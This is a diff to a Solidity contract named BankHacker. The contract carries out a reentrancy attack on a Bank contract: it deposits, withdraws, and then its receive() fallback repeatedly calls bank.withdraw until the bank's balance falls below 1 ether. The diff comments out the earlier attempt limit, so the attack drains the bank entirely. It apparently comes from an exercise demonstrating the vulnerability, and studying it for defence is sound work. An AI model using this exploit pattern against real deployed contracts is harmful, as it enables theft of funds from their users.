@@ -17,9 +17,20 @@ pragma solidity ^0.8.11;
 
 contract BankHacker {
 
+    error InsufficientBalanceToPerformDeposit();
+
     Bank public bank;
     uint private hackAttemptNumber = 0;
     uint private maxHackAttempts = 2;
+    uint256 private depositAmount       = 1000000000000000000; // 1 ether
+    uint256 private withdrawalAmount    = 1000000000000000000; // 1 ether
+
+    event HackerBalance(
+        address contractAddress,
+        uint    contractBalance,
+        string  timingOfDeposit
+    );
+
 
     event SendDeposit(
         address depositToAddress,
@@ -47,59 +58,83 @@ contract BankHacker {
     function initializeBalance() external payable {
         // Balance sent in msg.value will be added to contract balance automatically
     }
-    function makeDeposit() external {
-        // make a deposit of 1 ether into the bank contract, then immediately withdraw
-
-        uint depositValue = 100000000000000000000; // 100 ether
-
-        emit SendDeposit(
-            address(this),
-            depositValue, 
-            "makeDeposit"
-        );
-        
-        bank.deposit(payable(address(this)), depositValue);
-        this.withdraw();
-
+    function getContractBalance() external view returns(uint) {
+        return address(this).balance;
     }
     function getDepositBalance() external view returns(uint) {
         return bank.getDepositBalance(address(this));
     }
+    function makeDeposit() external payable {
 
-    function withdraw () external payable {
+        // Signed tx sends in 1 ether, which is immediately += contract balance
+
+        if( msg.value > address(this).balance ) {
+            revert InsufficientBalanceToPerformDeposit();
+        }
+        uint contractBalance = address(this).balance;
+
+        emit HackerBalance(
+            address(this),
+            contractBalance,
+            "beforeDeposit"
+        );
+        
+        emit SendDeposit(
+            address(this),
+            msg.value, 
+            "makeDeposit"
+        );
+
+        // deposit funds
+        bank.deposit{value: msg.value}( address(this) );
+        
+        contractBalance = address(this).balance;
+        emit HackerBalance(
+            address(this),
+            contractBalance,
+            "afterDeposit"
+        );
+
+        // withdraw funds
+        this.withdraw();
+
+
+    }
+
+    function withdraw () external {
   
         // reset hack attempts
         hackAttemptNumber = 0;
 
-        uint withdrawalValue = 1 ether; // 1 ether
-
         emit RequestWithdrawal(
             address(this), 
-            withdrawalValue, 
+            withdrawalAmount,
             "withdraw"
         );
 
         // normal withdrawal, not a "hack"
-        bank.withdraw(payable(address(this)), withdrawalValue);
+        bank.withdraw(payable(address(this)), withdrawalAmount);
 
     }
 
     receive () external payable {
         
+        emit HackerReceivedFunds(
+            address(this), 
+            msg.value, 
+            hackAttemptNumber, 
+            "receive"
+        );
 
-        if( (address(bank).balance > 1 ether) && (hackAttemptNumber < maxHackAttempts) ) {
+        // if( (address(bank).balance > 1 ether) && (hackAttemptNumber < maxHackAttempts) ) {
+        if( (address(bank).balance >= withdrawalAmount) )  {
+
 
             hackAttemptNumber += 1;
 
-            bank.withdraw(payable(address(this)), 1 ether);
+            bank.withdraw(payable(address(this)), withdrawalAmount);
             
-            emit HackerReceivedFunds(
-                address(this), 
-                msg.value, 
-                hackAttemptNumber, 
-                "receive"
-            );
-        } 
+        }
     }
 
-}
+} 
